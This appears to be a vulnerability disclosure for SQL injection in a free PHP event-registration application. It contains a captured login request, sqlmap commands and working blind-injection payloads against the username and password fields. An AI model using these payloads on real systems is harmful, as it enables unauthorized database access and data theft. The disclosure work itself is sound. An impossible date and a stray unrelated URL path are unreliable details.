# Event Registration System - SQL Injection - 1
+ **Exploit Title:** Event Registration System - SQL Injection - 1
+ **Date:** 2024-17-04
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://www.sourcecodester.com/php/14884/event-registration-system-qr-code-php-free-source-code.html
+ **Software Link:** https://www.sourcecodester.com/download-code?nid=14884&title=Event+Registration+System+with+QR+Code+in+PHP+Free+Source+Code
+ **Version:** 1.0(2024)
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
Event Registration System allows SQL Injection via the 'username' & 'password' parameters at "http://localhost/event/portal.php" or "http://localhost/event/admin/login.php"
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/event/portal.php" or "http://localhost/event/admin/login.php"
+ Then go to http://localhost/onlinecourse/pincode-verification.php
+ Try logging in by typing random things
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:

```
POST /event/classes/Login.php?f=rlogin HTTP/1.1
Host: localhost
Content-Length: 27
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
sec-ch-ua-platform: "Linux"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/event/portal.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: language=en; continueCode=5vLeVxlRzkNb47vKDPMo5Lq8wdzLtvf1Hem0jn6EZm2ygrX19BpaQWOJY3oM; welcomebanner_status=dismiss; cookieconsent_status=dismiss; PHPSESSID=cc12r4c7k38a4endfa1btuk5he
Connection: close

username=test&password=test
```

+ Use sqlmap to exploit. In sqlmap, use 'username' parameter to dump the database.
```
sqlmap -r r.txt -p username --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=test' OR NOT 5457=5457-- oeCl&password=test

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 3350 FROM (SELECT(SLEEP(5)))YATt)-- HCBw&password=test
---
[18:13:19] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[18:13:19] [INFO] fetching current database           
current database: 'event_db'

```
+ current database: `event_db`

![Ekran görüntüsü 2024-05-18 141313](https://github.com/BurakSevben/CVEs/assets/117217689/087fffb2-8767-462a-b05c-e09b95954d3b)


## Password 
+ Use sqlmap to exploit. In sqlmap, use 'password' parameter to dump the database.
```
sqlmap -r r.txt -p password --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: password (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=test&password=test') OR NOT 9672=9672-- ZitY

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test&password=test') AND (SELECT 5164 FROM (SELECT(SLEEP(5)))xkcG)-- nIna
---
[18:14:58] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.2.12, Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[18:14:58] [INFO] fetching current database
current database: 'event_db'
```
+ current database: `event_db`

![Ekran görüntüsü 2024-05-18 143806](https://github.com/BurakSevben/CVEs/assets/117217689/db7f440c-90a0-4bcf-9327-55d0d672a930)


